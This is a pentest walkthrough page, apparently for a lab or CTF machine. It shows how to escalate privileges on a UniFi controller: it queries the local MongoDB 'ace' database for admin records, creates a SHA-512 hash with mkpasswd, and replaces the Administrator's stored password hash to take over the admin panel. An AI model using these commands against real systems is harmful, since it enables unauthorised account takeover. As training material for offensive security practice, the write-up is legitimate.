# MONGODB ESCALATION (UNIFI)

***

## <mark style="color:red;">**Privilege Escalation with MONGODB**</mark>

First let's check if MongoDB is running on the target system, which might make it possible for us to extract credentials in order to login to the administrative panel

```
ps aux | grep mongo
```

We can see MongoDB is running on the target system on port 27117 .&#x20;

Let's interact with the MongoDB service by making use of the mongo command line utility and attempting to extract the administrator password.&#x20;

A quick Google search using the keywords UniFi Default Database shows that the default database name for the UniFi application is ace .&#x20;

```sh
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

<figure><img src="../../.gitbook/assets/Screenshot from 2025-01-27 11-04-14.png" alt=""><figcaption></figcaption></figure>

The output reveals a user called Administrator. Their password hash is located in the x\_shadow variable but in this instance it cannot be cracked with any password cracking utilities. Instead we can change the x\_shadow password hash with our very own created hash in order to replace the administrators password and authenticate to the administrative panel. To do this we can use the mkpasswd command line utility.

{% code overflow="wrap" fullWidth="true" %}
```sh
mkpasswd -m sha-512 Password1234
$6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XX
M8P5Z8j4NB1gJGTONl1
```
{% endcode %}

{% hint style="warning" %}
The $6$ is the identifier for the hashing algorithm that is being used, which is SHA-512 in this case, therefore we will have to make a hash of the same type.

SHA-512, or Secure Hash Algorithm 512, is a hashing algorithm used to convert text of any length into a fixed-size string. Each output produces a SHA-512 length of 512 bits (64 bytes). This algorithm is commonly used for email addresses hashing, password hashing...
{% endhint %}

Let's proceed to replacing the existing hash with the one we created.

{% code overflow="wrap" fullWidth="true" %}
```sh
mongo --port 27117 ace --eval 'db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
```
{% endcode %}

{% hint style="danger" %}
UniFi offers a setting for SSH Authentication, which is a functionality that allows you to administer other Access Points over SSH from a console or terminal. Navigate to settings -> site and scroll down to find the SSH Authentication setting. SSH authentication with a root password has been enabled.
{% endhint %}

***
